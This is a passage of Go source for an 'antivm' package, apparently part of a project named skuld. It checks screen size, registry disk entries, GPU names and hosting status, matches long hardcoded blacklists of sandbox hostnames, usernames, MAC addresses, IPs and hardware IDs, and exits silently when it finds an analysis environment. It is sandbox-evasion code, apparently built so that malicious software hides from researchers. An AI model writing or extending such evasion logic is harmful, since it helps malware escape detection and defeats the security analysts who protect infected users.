package antivm

import (
	"os"
	"os/exec"
	"strings"
	"syscall"

	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"

	"golang.org/x/sys/windows/registry"
)

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func IsBlacklistedUsername(usernames []string) bool {
	return contains(usernames, os.Getenv("USERNAME"))
}

func IsBlacklistedHostname(hostnames []string) bool {
	return contains(hostnames, os.Getenv("COMPUTERNAME"))
}

func IsBlacklistedHWID(hwids []string) bool {
	hwid, err := hardware.GetHWID()
	if err != nil {
		return false
	}
	return contains(hwids, hwid)
}

func IsBlacklistedMAC(macs []string) bool {
	mac, err := hardware.GetMAC()
	if err != nil {
		return false
	}
	return contains(macs, mac)
}

func IsBlacklistedIP(ips []string) bool {
	ip, err := requests.Get("https://api.ipify.org/")
	if err != nil {
		return IsBlacklistedIP(ips)
	}
	return contains(ips, string(ip))
}

func IsScreenSmall() bool {
	getSystemMetrics := syscall.NewLazyDLL("user32.dll").NewProc("GetSystemMetrics")
	width, _, _ := getSystemMetrics.Call(0)
	height, _, _ := getSystemMetrics.Call(1)

	if width < 800 || height < 600 {
		return true
	}
	return false
}

func IsHosted() bool {
	hosted, err := requests.Get("http://ip-api.com/line/?fields=hosting")
	if err != nil {
		return IsHosted()
	}
	return strings.TrimSpace(string(hosted)) == "true"
}

func RegistryCheck() bool {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\Disk\Enum`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()
	value, _, err := key.GetStringValue("0")
	if err != nil {
		return false
	}

	return strings.Contains(value, "VMware") || strings.Contains(value, "VBOX")
}

func GraphicsCardCheck() bool {
	cmd := exec.Command("wmic", "path", "win32_VideoController", "get", "name")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	gpu, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(strings.ToLower(string(gpu)), "virtualbox") || strings.Contains(strings.ToLower(string(gpu)), "vmware")
}

func Run() {
	if IsScreenSmall() {
		os.Exit(0)
	}

	blacklistedHostnames := []string{"WORK", "JERRY-TRUJILLO", "w0fjuOVmCcP5A", "DESKTOP-1PYKP29", "DESKTOP-VRSQLAG", "DESKTOP-V1L26J5", "azure", "WINZDS-8MAEI8E4", "BAROSINO-PC", "DESKTOP-HSS0DJ9", "DESKTOP-NAKFFMT", "DESKTOP-NTU7VUO", "DESKTOP-GLBAZXT", "CRYPTODEV222222", "3u2v9m8", "xc64zb", "DESKTOP-DIL6IYA", "DESKTOP-JHUHOTB", "DESKTOP-USLVD7G", "DESKTOP-PKQNDSR", "desktop-nakffmt", "NTT-EFF-2W11WSS", "8VizSM", "compname_5076", "DESKTOP-54XGX6F", "WINZDS-AM76HPK2", "DESKTOP-QLN2VUF", "DESKTOP-XWQ5FUV", "DESKTOP-S1LFPHO", "3CECEFC83806", "DESKTOP-ZYQYSRD", "DESKTOP-IAPKN1P", "0CC47AC83803", "gYyZc9HZCYhRLNg", "Steve", "DESKTOP-LTMCKLA", "DESKTOP-UHHSY4R", "SERVER1", "DESKTOP-BGN5L8Y", "DESKTOP-AUPFKSY", "DESKTOP-WG3MYJS", "DESKTOP-RSNLFZS", "DESKTOP-RHXDKWW", "00900BC83803", "SYKGUIDE-WS17", "DESKTOP-WS7PPR2", "EIEEIFYE", "Peter Wilson", "GBQHURCC", "PROPERTY-LTD", "desktop-7xc6gez", "SERVER-PC", "bee7370c-8c0c-4", "373836", "DESKTOP-CNFVLMW", "DESKTOP-4GCZVJU", "WINZDS-3FF2I9SN", "BEE7370C-8C0C-4", "COFFEE-SHOP", "DESKTOP-NM1ZPLG", "Julia", "MIKE-PC", "DESKTOP-G4CWFLF", "6C4E733F-C2D9-4", "DESKTOP-ZOJJ8KL", "DESKTOP-CM0DAW8", "WINZDS-5J75DTHH", "WINZDS-6TUIHN7R", "DESKTOP-19OLLTD", "DESKTOP-KALVINO", "NETTYPC", "PqONjHVwexsS", "DESKTOP-CRCCCOT", "LOUISE-PC", "DESKTOP-ION5ZSB", "PxmdUOpVyx", "DESKTOP-KOKOVSK", "DESKTOP-RCA3QWX", "DESKTOP-AHGXKTV", "DESKTOP-B9OARKC", "DESKTOP-5OV9S0O", "DESKTOP-RP4FIBL", "b30f0242-1c6a-4", "DESKTOP-B0T93D6", "DESKTOP-W8JLV9V", "DESKTOP-ZV9GVYL", "ORXGKKZC", "lisa-pc", "DESKTOP-GNQZM0O", "DESKTOP-ZNCAEAM", "desktop-vrsqlag", "DESKTOP-ECWZXY2", "RDhJ0CNFevzX", "ALIONE", "Q9IATRKPRH", "Abby", "BECKER-PC", "DESKTOP-F7BGEN9", "DESKTOP-QUAY8GS", "WINZDS-VQH86L5D", "DESKTOP-6UJBD2J", "EFA0FDEC-8FA7-4", "work", "kEecfMwgj", "HEUeRzl", "DESKTOP-D4FEN3M", "DESKTOP-NKP0I4P", "DESKTOP-SUNDMI5", "DESKTOP-VWJU7MF", "6c4e733f-c2d9-4", "ACEPC", "DESKTOP-4U8DTF8", "DESKTOP-ZJRWGX5", "ralphs-pc", "B30F0242-1C6A-4", "DESKTOP-O6FBMF7", "GANGISTAN", "DESKTOP-CHAYANN", "DESKTOP-Y8ASUIL", "FERREIRA-W10", "DESKTOP-WDT1SL6", "DESKTOP-GCN6MIO", "Paul Jones", "DESKTOP-7AFSTDP", "DESKTOP-ALBERTO", "TVM-PC", "DESKTOP-8K9D93B", "WINZDS-B03L9CEO", "desktop-wi8clet", "DESKTOP-VZ5ZSYI", "WINZDS-K7VIK4FC", "DESKTOP-FCRB3FM", "oreleepc", "desktop-1y2433r", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "win-5e07cos9alr", "C81F66C83805", "WINDOWS-EEL53SN", "archibaldpc", "DESKTOP-FSHHZLJ", "DESKTOP-GPPK5VQ", "DESKTOP-XOY7MHS", "desktop-5ov9s0o", "DESKTOP-ZJF9KAN", "d1bnJkfVlH", "JBYQTQBO", "MARCI-PC", "desktop-vkeons4", "patex", "lmVwjj9b", "DESKTOP-JQPIFWD", "DESKTOP-7XC6GEZ", "GRXNNIIE", "WINZDS-RST0E8VU", "TIQIYLA9TW5M", "desktop-1pykp29", "WINZDS-BUAOKGG1", "george", "john-pc", "desktop-b0t93d6", "DESKTOP-VYRNO7M", "DESKTOP-J5XGGXR", "DESKTOP-GELATOR", "DESKTOP-IFCAQVL", "QarZhrdBpj", "PC-DANIELE", "GRAFPC", "DESKTOP-HQLUWFA", "WINZDS-MILOBM35", "qarzhrdbpj", "DESKTOP-BXJYAEC", "DESKTOP-FLTWYYU", "DESKTOP-BUGIO", "WIN-5E07COS9ALR", "LUCAS-PC", "WINZDS-9IO75SVG", "DESKTOP-MJC6500", "DESKTOP-UBDJJ0A", "RALPHS-PC", "WINZDS-U95191IG", "EA8C2E2A-D017-4", "julia-pc", "DESKTOP-ZMYEHDA", "XGNSVODU", "ZELJAVA", "DESKTOP-YW9UO1H", "DESKTOP-MWFRVKH", "Frank", "DESKTOP-DE369SE", "ESPNHOOL", "ARCHIBALDPC", "DESKTOP-CDQE7VN", "q9iatrkprh", "LANTECH-LLC", "DESKTOP-70T5SDX", "COMPNAME_4047", "DESKTOP-6AKQQAM", "DESKTOP-CBGPFEE", "DESKTOP-SUPERIO", "T00917", "APPONFLY-VPS", "WINZDS-BMSMD8ME", "DESKTOP-6BMFT65", "desktop-wg3myjs", "DESKTOP-VIRENDO", "DOMIC-DESKTOP", "WINZDS-QNGKGN59", "DESKTOP-KXP5YFO", "d1bnjkfvlh", "Lisa", "DESKTOP-VKNFFB6", "DESKTOP-SCNDJWE", "test42", "WDAGUtilityAccount", "DESKTOP-PA0FNV5", "XC64ZB", "WINZDS-22URJIBV", "ORELEEPC", "VONRAHEL", "WINZDS-1BHRVPQU", "DESKTOP-HASANLO", "LISA-PC", "DESKTOP-DAU8GJ2", "John", "WILEYPC", "JOHN-PC", "8Nl0ColNQ5bq", "desktop-d019gdm", "DESKTOP-WA2BY3L", "TMKNGOMU", "server1", "ALENMOOS-PC", "DESKTOP-62YPFIQ", "hmarc", "DESKTOP-64ACUCH", "JUDES-DOJO", "wileypc", "DESKTOP-K8Y2SAM", "AIDANPC", "DESKTOP-1Y2433R", "JULIA-PC"}
	if IsBlacklistedHostname(blacklistedHostnames) {
		os.Exit(0)
	}

	blacklistedUsernames := []string{"w0fjuOVmCcP5A", "43By4", "azure", "GJAm1NxXVm", "9yjCPsEYIMH", "noK4zG7ZhOf", "Lucas", "7wjlGX7PjlW4", "Amy", "3u2v9m8", "05h00Gi0", "BXw7q", "dOuyo8RV71", "7DBgdxu", "5Y3y73", "8VizSM", "xUnUy", "server", "5ISYH9SH", "XMiMmcKziitD", "Steve", "TVM", "JAW4Dz0", "h86LHD", "05KvAUQKPQ", "DdQrgc", "G2DbYLDgzz8Y", "pf5vj", "UiQcX", "OgJb6GqgK0O", "harry johnson", "test", "j6SHA37KA", "6O4KyHhJXBiR", "DVrzi", "jude", "Julia", "keecfmwgj", "nZAp7UBVaS1", "QfofoG", "lK3zMR", "PqONjHVwexsS", "PxmdUOpVyx", "mike", "Of20XqH4VL", "ICQja5iT", "pxmduopvyx", "JcOtj17dZx", "DefaultAccount", "PgfV1X", "frank", "fred", "QZSBJVWM", "QmIS5df7u", "RGzcBUyrznReg", "RDhJ0CNFevzX", "Abby", "john", "kEecfMwgj", "lubi53aN14cU", "HEUeRzl", "UspG1y1C", "ecVtZ5wE", "xPLyvzr8sgC", "5sIBK", "8nl0colnq5bq", "cMkNdS6", "qZo9A", "IZZuXj", "BUiA1hkm", "EGG0p", "abby", "8vizsm", "wdagutilityaccount", "Paul Jones", "vzY4jmH0Jw02", "pWOuqdTDQ", "e60UW", "Uox1tzaMO", "BvJChRPnsxn", "ASPNET", "ykj0egq7fze", "peter wilson", "S7Wjuf", "User01", "Mr.None", "tHiF2T", "pqonjhvwexss", "AppOnFlySupport", "patex", "lmVwjj9b", "j7pNjWM", "equZE3J", "george", "john-pc", "GjBsjb", "zOEsT", "o6jdigq", "OZFUCOD6", "w0fjuovmccp5a", "o8yTi52T", "uHUQIuwoEFU", "Louise", "Harry Johnson", "h7dk1xPr", "kFu0lQwgX5P", "PateX", "lisa", "umyUJ", "cM0uEGN4do", "l3cnbB8Ar5b8", "Frank", "KUv3bT4", "rB5BnfuR2", "julia", "Guest", "GGw8NR", "txWas1m2t", "64F2tKIqO5", "QORxJKNk", "3W1GJT", "ryjIJKIrOMs", "tvm", "Lisa", "WDAGUtilityAccount", "GexwjQdjXG", "sal.rosenburg", "ymONofg", "fNBDSlDTXY", "heuerzl", "21zLucUnfI85", "gL50ksOp", "IVwoKUF", "SqgFOf3G", "a.monaldo", "4tgiizsLimS", "John", "8Nl0ColNQ5bq", "8LnfAai9QdJR", "j.seance", "hmarc", "gu17B", "dxd8DJ7c", "lmvwjj9b", "rdhj0cnfevzx"}
	if IsBlacklistedUsername(blacklistedUsernames) {
		os.Exit(0)
	}

	blacklistedMacAddresses := []string{"", "00:50:56:a0:af:75", "00:e0:4c:cb:62:08", "2e:62:e8:47:14:49", "00:50:56:b3:50:de", "00:50:56:b3:ea:ee", "00:50:56:b3:14:59", "94:de:80:de:1a:35", "42:01:0a:8e:00:22", "00:50:56:b3:3b:a6", "ac:1f:6b:d0:48:fe", "00:50:56:ae:5d:ea", "ca:4d:4b:ca:18:cc", "52:54:00:b3:e4:71", "52:54:00:a0:41:92", "00:0c:29:05:d8:6e", "00:15:5d:00:00:a4", "d4:81:d7:ed:25:54", "d6:03:e4:ab:77:8e", "00:e0:4c:56:42:97", "00:50:56:b3:dd:03", "00:25:90:36:65:0c", "3c:ec:ef:44:01:0c", "92:4c:a8:23:fc:2e", "00:e0:4c:4b:4a:40", "00:50:56:b3:4c:bf", "00:15:5d:00:05:8d", "00:50:56:b3:38:68", "00:e0:4c:7b:7b:86", "52:54:00:3b:78:24", "08:00:27:3a:28:73", "42:01:0a:96:00:33", "b6:ed:9d:27:f4:fa", "00:e0:4c:94:1f:20", "00:e0:4c:d6:86:77", "00:50:56:b3:42:33", "00:15:5d:13:6d:0c", "4e:79:c0:d9:af:c3", "00:15:5d:b6:e0:cc", "00:03:47:63:8b:de", "00:e0:4c:44:76:54", "00:50:56:a0:06:8d", "00:1b:21:13:32:51", "00:50:56:a0:39:18", "00:50:56:ae:e5:d5", "ea:02:75:3c:90:9f", "00:15:5d:00:05:d5", "00:50:56:b3:94:cb", "00:15:5d:13:66:ca", "00:1b:21:13:33:55", "00:1b:21:13:15:20", "56:e8:92:2e:76:0d", "3c:ec:ef:44:01:aa", "00:15:5d:23:4c:ad", "00:50:56:b3:ee:e1", "00:50:56:a0:61:aa", "00:15:5d:00:00:b3", "00:50:56:97:f6:c8", "08:00:27:45:13:10", "ac:1f:6b:d0:4d:e4", "90:48:9a:9d:d5:24", "00:15:5d:1e:01:c8", "00:50:56:97:a1:f8", "00:50:56:b3:fa:23", "c8:9f:1d:b6:58:e4", "1c:99:57:1c:ad:e4", "00:15:5d:00:00:1d", "a6:24:aa:ae:e6:12", "16:ef:22:04:af:76", "52:54:00:8b:a6:08", "12:f8:87:ab:13:ec", "32:11:4d:d0:4a:9e", "d4:81:d7:87:05:ab", "00:1b:21:13:32:20", "00:15:5d:00:00:c3", "00:0c:29:52:52:50", "00:23:cd:ff:94:f0", "b4:a9:5a:b1:c6:fd", "00:0c:29:2c:c1:21", "60:02:92:66:10:79", "00:50:56:b3:05:b4", "1a:6c:62:60:3b:f4", "56:b0:6f:ca:0a:e7", "00:50:56:97:ec:f2", "00:50:56:a0:84:88", "00:50:56:a0:d7:38", "4e:81:81:8e:22:4e", "00:e0:4c:b3:5a:2a", "42:01:0a:96:00:22", "00:50:56:b3:38:88", "06:75:91:59:3e:02", "3c:ec:ef:44:00:d0", "00:15:5d:00:06:43", "00:25:90:36:f0:3b", "00:15:5d:00:00:f3", "00:50:56:b3:d0:a7", "60:02:92:3d:f1:69", "00:50:56:a0:d0:fa", "1e:6c:34:93:68:64", "00:e0:4c:b8:7a:58", "00:50:56:a0:cd:a8", "ac:1f:6b:d0:4d:98", "00:50:56:b3:09:9e", "3e:53:81:b7:01:13", "00:25:90:36:65:38", "00:50:56:ae:6f:54", "00:0d:3a:d2:4f:1f", "00:50:56:b3:f6:57", "7e:05:a3:62:9c:4d", "42:01:0a:8a:00:22", "5a:e2:a6:a4:44:db", "00:15:5d:00:01:81", "3c:ec:ef:43:fe:de", "00:e0:4c:46:cf:01", "42:01:0a:8a:00:33", "00:15:5d:00:1c:9a", "42:85:07:f4:83:d0", "00:50:56:a0:45:03", "00:50:56:a0:dd:00", "c2:ee:af:fd:29:21", "3e:c1:fd:f1:bf:71", "00:1b:21:13:21:26", "00:50:56:ae:b2:b0", "52:54:00:ab:de:59", "00:50:56:a0:59:10", "00:50:56:b3:21:29", "be:00:e5:c5:0c:e5", "f6:a5:41:31:b2:78", "12:8a:5c:2a:65:d1", "00:1b:21:13:26:44", "00:15:5d:00:1a:b9", "00:50:56:a0:6d:86", "00:15:5d:00:02:26", "ac:1f:6b:d0:49:86", "96:2b:e9:43:96:76", "00:50:56:b3:91:c8", "00:50:56:b3:9e:9e", "00:25:90:65:39:e4", "00:15:5d:23:4c:a3", "5e:86:e4:3d:0d:f6", "2e:b8:24:4d:f7:de", "00:50:56:a0:38:06", "ea:f6:f1:a2:33:76", "12:1b:9e:3c:a6:2c", "00:15:5d:00:07:34"}
	if IsBlacklistedMAC(blacklistedMacAddresses) {
		os.Exit(0)
	}

	blacklistedIPAddresses := []string{"34.85.253.170", "109.74.154.90", "88.132.226.203", "34.145.89.174", "194.154.78.160", "95.25.81.24", "192.40.57.234", "92.211.192.144", "178.239.165.70", "34.83.46.130", "109.74.154.91", "34.145.195.58", "88.132.227.238", "104.18.12.38", "35.237.47.12", "92.211.52.62", "195.181.175.105", "193.128.114.45", "87.166.50.213", "195.239.51.3", "35.192.93.107", "188.105.91.143", "188.105.91.173", "79.104.209.33", "193.225.193.201", "213.33.142.50", "34.141.146.114", "88.132.225.100", "88.153.199.169", "34.141.245.25", "35.199.6.13", "88.132.231.71", "34.105.72.241", "34.253.248.228", "93.216.75.209", "92.211.109.160", "None", "84.147.62.12", "195.239.51.59", "95.25.204.90", "212.119.227.151", "20.99.160.173", "34.105.0.27", "80.211.0.97", "109.145.173.169", "34.138.96.23", "78.139.8.50", "34.85.243.241", "84.147.54.113", "195.74.76.222", "192.211.110.74", "192.87.28.103", "64.124.12.162", "34.105.183.68", "212.119.227.167", "34.142.74.220", "92.211.55.199", "109.74.154.92", "188.105.91.116", "35.229.69.227", "23.128.248.46"}
	if IsBlacklistedIP(blacklistedIPAddresses) {
		os.Exit(0)
	}

	blacklistedHWIDs := []string{"361E3342-9FAD-AC1C-F1AD-02E97892270F", "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9", "49434D53-0200-9065-2500-659025002274", "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72", "83BFD600-3C27-11EA-8000-3CECEF4400B4", "A1A849F7-0D57-4AD3-9073-C79D274EECC8", "C249957A-AA08-4B21-933F-9271BEC63C85", "FED63342-E0D6-C669-D53F-253D696D74DA", "A7721742-BE24-8A1C-B859-D7F8251A83D3", "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F", "1AAD2042-66E8-C06A-2F81-A6A4A6A99093", "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA", "49434D53-0200-9065-2500-659025005073", "52562042-B33F-C9D3-0149-241F40A0F5D8", "AAFC2042-4721-4E22-F795-A60296CAC029", "050C3342-FADD-AEDF-EF24-C6454E1A73C9", "E3BB3342-02A8-5613-9C92-3747616194FD", "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D", "F705420F-0BB3-4688-B75C-6CD1352CABA9", "79AF5279-16CF-4094-9758-F88A616D81B4", "2AB86800-3C50-11EA-8000-3CECEF440130", "00000000-0000-0000-0000-AC1F6BD04976", "FE822042-A70C-D08B-F1D1-C207055A488F", "00000000-0000-0000-0000-AC1F6BD04978", "D8C30328-1B06-4611-8E3C-E433F4F9794E", "0910CBA3-B396-476B-A7D7-716DB90F5FB9", "B1112042-52E8-E25B-3655-6A4F54155DBF", "138D921D-680F-4145-BDFF-EC463E70C77D", "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F", "FBC62042-5DE9-16AD-3F27-F818E5F68DD3", "FC40ACF8-DD97-4590-B605-83B595B0C4BA", "00000000-0000-0000-0000-AC1F6BD04DC0", "0A9D60D4-9A32-4317-B7C0-B11B5C677335", "F9E41000-3B35-11EA-8000-3CECEF440150", "11111111-2222-3333-4444-555555555555", "9B2F7E00-6F4C-11EA-8000-3CECEF467028", "CD74107E-444E-11EB-BA3A-E3FDD4B29537", "E08DE9AA-C704-4261-B32D-57B2A3993518", "00000000-0000-0000-0000-AC1F6BD04C0A", "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED", "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C", "2E6FB594-9D55-4424-8E74-CE25A25E36B0", "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9", "03DE0294-0480-05DE-1A06-350700080009", "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603", "91625303-5211-4AAC-9842-01A41BA60D5A", "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5", "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E", "03AA02FC-0414-0507-BC06-D70700080009", "00000000-0000-0000-0000-AC1F6BD048FE", "9921DE3A-5C1A-DF11-9078-563412000026", "9FC997CA-5081-4751-BC78-CE56D06F6A62", "213D2878-0E33-4D8C-B0D1-31425B9DE674", "00000000-0000-0000-0000-AC1F6BD04DCC", "13A61742-AF45-EFE4-70F4-05EF50767784", "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF", "00000000-0000-0000-0000-AC1F6BD04D98", "F68B2042-E3A7-2ADA-ADBC-A6274307A317", "26645000-3B67-11EA-8000-3CECEF440124", "0D748400-3B00-11EA-8000-3CECEF44007E", "3F284CA4-8BDF-489B-A273-41B44D668F6D", "6881083C-EE5A-43E7-B7E3-A0CE9227839C", "89E32042-1B2B-5C76-E966-D4E363846FD4", "51646514-93E1-4CB6-AF29-036B45D14CBF", "38813342-D7D0-DFC8-C56F-7FC9DFE5C972", "F5744000-3C78-11EA-8000-3CECEF43FEFE", "00000000-0000-0000-0000-AC1F6BD04926", "9EB0FAF6-0713-4576-BD64-813DEE9E477E", "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28", "67C5A563-3218-4718-8251-F38E3F6A89C1", "FA8C2042-205D-13B0-FCB5-C5CC55577A35", "699400A5-AFC6-427A-A56F-CE63D3E121CB", "DD45F600-3C63-11EA-8000-3CECEF440156", "84782042-E646-50A0-159F-A8E75D4F9402", "E6DBCCDF-5082-4479-B61A-6990D92ACC5F", "95BF6A00-3C63-11EA-8000-3CECEF43FEB8", "2DD1B176-C043-49A4-830F-C623FFB88F3C", "3EDC0561-C455-4D64-B176-3CFBBBF3FA47", "4CB82042-BA8F-1748-C941-363C391CA7F3", "4729AEB0-FC07-11E3-9673-CE39E79C8A00", "7D341C16-E8E9-42EA-8779-93653D877231", "F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C", "00000000-0000-0000-0000-AC1F6BD048F8", "5E573342-6093-4F2D-5F78-F51B9822B388", "05790C00-3B21-11EA-8000-3CECEF4400D0", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "FCE23342-91F1-EAFC-BA97-5AAE4509E173", "49434D53-0200-9036-2500-369025000C65", "D2DC3342-396C-6737-A8F6-0C6673C1DE08", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "A5CE2042-8D25-24C4-71F7-F56309D7D45F", "E57F6333-A2AC-4F65-B442-20E928C0A625", "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "B9DA2042-0D7B-F938-8E8A-DA098462AAEC", "D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB", "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F", "8703841B-3C5E-461C-BE72-1747D651CE89", "E2342042-A1F8-3DCF-0182-0E63D607BCC7", "481E2042-A1AF-D390-CE06-A8F783B1E76A", "1D4D3342-D6C4-710C-98A3-9CC6571234D5", "EADD1742-4807-00A0-F92E-CCD933E9D8C1", "3E9AC505-812A-456F-A9E6-C7426582500E", "5EBC5C00-3B70-11EA-8000-3CECEF4401DA", "88DC3342-12E6-7D62-B0AE-C80E578E7B07", "14692042-A78B-9563-D59D-EB7DD2639037", "42A82042-3F13-512F-5E3D-6BF4FFFD8518", "00000000-0000-0000-0000-AC1F6BD048D6", "7E4755A6-7160-4982-8F5D-6AA481749F10", "907A2A79-7116-4CB6-9FA5-E5A58C4587CD", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "40384E87-1FBA-4096-9EA1-D110F0EA92A8", "3A9F3342-D1F2-DF37-68AE-C10F60BFB462", "E0C806ED-B25A-4744-AD7D-59771187122E", "12EE3342-87A2-32DE-A390-4C2DA4D512E9", "63FA3342-31C7-4E8E-8089-DAFF6CE5E967", "90A83342-D7E7-7A14-FFB3-2AA345FDBC89", "49434D53-0200-9036-2500-369025005CF0", "6E963342-B9C8-2D14-B057-C60C35722AD4", "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC", "782ED390-AE10-4727-A866-07018A8DED22", "777D84B3-88D1-451C-93E4-D235177420A7", "671BC5F7-4B0F-FF43-B923-8B1645581DC8", "52A1C000-3BAB-11EA-8000-3CECEF440204", "00000000-0000-0000-0000-AC1F6BD049B8", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB", "A100EFD7-4A31-458F-B7FE-2EF95162B32F", "4EDF3342-E7A2-5776-4AE5-57531F471D56", "00000000-0000-0000-0000-AC1F6BD0491C", "59C68035-4B21-43E8-A6A6-BD734C0EE699", "63DE70B4-1905-48F2-8CC4-F7C13B578B34", "B22B623B-6B62-4F9B-A9D3-94A15453CEF4", "49434D53-0200-9065-2500-65902500E439", "CEFC836C-8CB1-45A6-ADD7-209085EE2A57", "03D40274-0435-05BF-D906-D20700080009", "11E12042-2404-040A-31E4-27374099F748", "56B9F600-3C1C-11EA-8000-3CECEF4401DE", "A2339E80-BB69-4BF5-84BC-E9BE9D574A65", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "D7AC2042-05F8-0037-54A6-38387D00B767", "12204D56-28C0-AB03-51B7-44A8B7525250", "9CFF2042-2043-0340-4F9C-4BAE6DC5BB39", "7A484800-3B19-11EA-8000-3CECEF440122", "2F94221A-9D07-40D9-8C98-87CB5BFC3549", "222EFE91-EAE3-49F1-8E8D-EBAE067F801A", "7AB5C494-39F5-4941-9163-47F54D6D5016", "D7382042-00A0-A6F0-1E51-FD1BBF06CD71", "40F100F9-401C-487D-8D37-48107C6CE1D3", "A9C83342-4800-0578-1EE8-BA26D2A678D2", "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6", "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E", "0700BEF3-1410-4284-81B1-E5C17FA9E18F", "49434D53-0200-9036-2500-36902500F022", "2F230ED7-5797-4DB2-BAA0-99A193503E4B", "F5EFEEAC-96A0-11EB-8365-FAFE299935A9", "BB233342-2E01-718F-D4A1-E7F69D026428", "D4260370-C9F1-4195-95A8-585611AE73F2", "0B8A2042-2E8E-BECC-B6A4-7925F2163DC9", "4CE94980-D7DA-11DD-A621-08606E889D9B", "00000000-0000-0000-0000-AC1F6BD04928", "C0342042-AF96-18EE-C570-A5EFA8FF8890", "119602E8-92F9-BD4B-8979-DA682276D385", "00000000-0000-0000-0000-AC1F6BD04986", "ACA69200-3C4C-11EA-8000-3CECEF4401AA", "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57", "00000000-0000-0000-0000-AC1F6BD04900", "00000000-0000-0000-0000-50E5493391EF", "BB64E044-87BA-C847-BC0A-C797D1A16A50", "9961A120-E691-4FFE-B67B-F0E4115D5919", "00000000-0000-0000-0000-AC1F6BD048DC", "9C6D1742-046D-BC94-ED09-C36F70CC9A91", "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5", "71522042-DA0B-6793-668B-CE95AEA7FE21", "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32", "00000000-0000-0000-0000-AC1F6BD04D06", "F5BB1742-D36D-A11E-6580-2EA2427B0038", "365B4000-3B25-11EA-8000-3CECEF44010C", "1B5D3FFD-A28E-4F11-9CD6-FF148989548C", "00000000-0000-0000-0000-000000000000", "C9283342-8499-721F-12BE-32A556C9A7A8", "76122042-C286-FA81-F0A8-514CC507B250", "94515D88-D62B-498A-BA7C-3614B5D4307C", "E67640B3-2B34-4D7F-BD62-59A1822DDBDC", "07AF2042-392C-229F-8491-455123CC85FB", "64176F5E-8F74-412F-B3CF-917EFA5FB9DB", "612F079A-D69B-47EA-B7FF-13839CD17404", "84FE3342-6C67-5FC6-5639-9B3CA3D775A1", "67442042-0F69-367D-1B2E-1EE846020090", "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E", "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1", "A15A930C-8251-9645-AF63-E45AD728C20C", "FE455D1A-BE27-4BA4-96C8-967A6D3A9661", "00000000-0000-0000-0000-AC1F6BD047A0", "104F9B96-5B46-4567-BF56-0066C1C6F7F0", "80152042-2F34-11D1-441F-5FADCA01996D", "C51E9A00-3BC3-11EA-8000-3CECEF440034", "73163342-B704-86D5-519B-18E1D191335C", "D5DD3342-46B5-298A-2E81-5CA6867168BE", "00000000-0000-0000-0000-AC1F6BD04850", "69AEA650-3AE3-455C-9F80-51159BAE5EAE", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "44B94D56-65AB-DC02-86A0-98143A7423BF", "49434D53-0200-9065-2500-659025008074", "7D6A0A6D-394E-4179-9636-662A8D2C7304", "499B0800-3C18-11EA-8000-3CECEF43FEA4", "72492D47-52EF-427A-B623-D4F2192F97D4", "921E2042-70D3-F9F1-8CBD-B398A21F89C6", "0F377508-5106-45F4-A0D6-E8352F51A8A5", "66729280-2B0C-4BD0-8131-950D86871E54", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "00000000-0000-0000-0000-AC1F6BD04972", "032E02B4-0499-05C3-0806-3C0700080009", "6ECEAF72-3548-476C-BD8D-73134A9182C8", "C6B32042-4EC3-6FDF-C725-6F63914DA7C7", "0934E336-72E4-4E6A-B3E5-383BD8E938C3", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "CC5B3F62-2A04-4D2E-A46C-AA41B7050712", "48941AE9-D52F-11DF-BBDA-503734826431", "00000000-0000-0000-0000-AC1F6BD04D08", "00000000-0000-0000-0000-AC1F6BD04D8E", "B5B77895-D40B-4F30-A565-6EF72586A14A", "F91C9458-6656-4E83-B84A-13641DE92949", "4C4C4544-0050-3710-8058-CAC04F59344A", "60C83342-0A97-928D-7316-5F1080A78E72", "FA612E42-DC79-4F91-CA17-1538AD635C95", "4DC32042-E601-F329-21C1-03F27564FD6C", "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "08C1E400-3C56-11EA-8000-3CECEF43FEDE", "FF577B79-782E-0A4D-8568-B35A9B7EB76B", "8DA62042-8B59-B4E3-D232-38B29A10964A", "49434D53-0200-9036-2500-369025003AF0", "49434D53-0200-9036-2500-369025003A65", 